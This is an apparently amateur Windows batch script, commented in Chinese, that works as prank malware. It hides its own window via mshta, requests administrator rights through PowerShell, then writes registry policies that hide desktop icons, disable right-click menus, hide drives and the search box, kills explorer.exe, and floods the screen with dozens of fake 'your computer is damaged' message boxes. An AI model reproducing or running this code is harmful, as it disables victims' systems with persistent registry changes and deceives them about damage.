::后台

if "%1"=="hide" goto CmdBegin
start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit
:CmdBegin

::管理员模式

@ECHO OFF&(PUSHD "%~DP0")&(REG QUERY "HKU\S-1-5-19">NUL 2>&1)||(
powershell -Command "Start-Process '%~sdpnx0' -Verb RunAs"&&EXIT)

::是否警告过用户
IF EXIST run.bat (
	start 123.txt
    ) ELSE (
	echo @echo off > run.bat
	echo color 0c >> run.bat
	echo echo THIS is a virus file, do you want to run it? >> run.bat
	echo ^pause >> run.bat
	echo echo THIS IS THE LAST WANRING,do you really want to RUN it? >> run.bat
	echo ^pause >> run.bat
	echo start gift1.0.bat >> run.bat
	echo exit >> run.bat
	echo haha > 123.txt
	echo 
	echo you computer have in virus !!! >> 123.txt
	start run.bat
	exit
    )

del run.bat


::通知电脑废了

@echo off
(
	echo msgbox "Your computer is no longer functioning properly",16,"haha"
) > 123.vbs

start 123.vbs

echo %time%
ping -n 3 127.0.0.1>nul
echo %time%

::隐藏图标

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f

::禁用右键

::桌面与文件夹
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t REG_DWORD /d 1 /f

::任务栏
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f

::禁用磁盘

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 12 /f

::禁用搜索栏

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableSearchBox /t REG_DWORD /d 1 /f

::禁用左侧栏

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer" /v SearchboxInNavBar /t REG_DWORD /d 0 /f

taskkill /f /im explorer.exe

::关闭vbs

taskkill -f -t -im wscript.exe

::vbs文件提出

@echo off
(
	echo msgbox "your computer is damage" ,16,"@_@"
) > your.vbs

@echo off
(
	echo msgbox "Do you have a problem with your computer or terminate the process?",50,"issue"
) > question.vbs

@echo off
(
	echo msgbox "I am a Windows computer, why are you messing me?",35,"windows"
) > windows.vbs

start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs

taskkill -f -t -im wscript.exe

start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs
start your.vbs

taskkill -f -t -im wscript.exe

start question.vbs

echo %time%
ping -n 3 127.0.0.1>nul
echo %time%

start your.vbs
start question.vbs
start question.vbs
start question.vbs
start question.vbs
start question.vbs
start question.vbs
start your.vbs
start question.vbs
start your.vbs
start question.vbs
start your.vbs
start question.vbs
start your.vbs
start question.vbs
start your.vbs
start question.vbs
start your.vbs

taskkill -f -t -im wscript.exe

start windows.vbs

echo %time%
ping -n 3 127.0.0.1>nul
echo %time%

start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
start windows.vbs
start your.vbs
start question.vbs
start your.vbs
exit

::@偷懒的猪 24.3.8
